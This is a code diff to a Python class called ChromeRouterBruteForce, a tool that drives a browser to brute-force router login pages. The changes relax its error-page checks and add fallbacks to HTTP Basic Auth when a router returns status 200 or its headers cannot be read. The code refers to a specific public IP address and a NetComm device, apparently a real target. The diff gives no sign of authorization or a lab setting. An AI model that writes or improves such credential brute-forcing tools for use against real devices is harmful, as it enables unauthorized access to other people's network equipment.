@@ -1103,17 +1103,24 @@ class ChromeRouterBruteForce:
                 return "error", f"Error page detected in title: {page_title}"
             
             # Check for empty or generic titles that might indicate errors
-            if not page_title or page_title.strip() == "" or page_title in ['211.27.181.3', 'NetComm']:
-                # Try to get more info about the page
+            # But be more lenient - only flag as error if we're sure it's an error page
+            if not page_title or page_title.strip() == "":
+                # For empty titles, try to get more info about the page
                 try:
                     # Check if page has any meaningful content
                     body_text = self.driver.find_element("tag name", "body").text.lower()
                     if any(error in body_text for error in error_indicators):
                         return "error", "Error page detected in body content"
-                    elif len(body_text.strip()) < 10:  # Very little content
+                    elif len(body_text.strip()) < 5:  # Very little content - be more lenient
                         return "error", "Page appears to be empty or error page"
+                    # If we have some content, don't treat as error - might be a valid page
                 except:
+                    # If we can't get body text, don't assume it's an error
                     pass
+            elif page_title in ['211.27.181.3', 'NetComm']:
+                # These might be valid router pages, don't treat as error immediately
+                # Let the authentication type detection handle it
+                pass
             
             # 🔍 **1. Check for API-Based Authentication**
             api_indicators = ['api', 'json', 'rest', 'ajax', 'xhr', 'fetch', 'axios', 'endpoint', 'service']
@@ -1177,9 +1184,17 @@ class ChromeRouterBruteForce:
                     elif 'digest' in auth_header:
                         print(f"{Colors.GREEN}[+] HTTP Digest authentication detected{Colors.END}")
                         return "digest", "HTTP Digest authentication detected"
+                elif response.status_code == 200:
+                    # Even if not 401, some routers might support basic auth
+                    # Check if we can access with basic auth
+                    print(f"{Colors.BLUE}[*] Status 200, checking if basic auth is supported{Colors.END}")
+                    return "basic", "Trying HTTP Basic Auth (status 200)"
                         
             except Exception as e:
                 print(f"{Colors.YELLOW}[!] Error checking HTTP auth headers: {e}{Colors.END}")
+                # If we can't check headers, still try basic auth as fallback
+                print(f"{Colors.BLUE}[*] Cannot check headers, trying HTTP Basic Auth as fallback{Colors.END}")
+                return "basic", "HTTP Basic Auth fallback"
             
             # 🔍 **7. Default fallback**
             print(f"{Colors.BLUE}[*] No specific auth type detected, trying HTTP Basic Auth{Colors.END}")
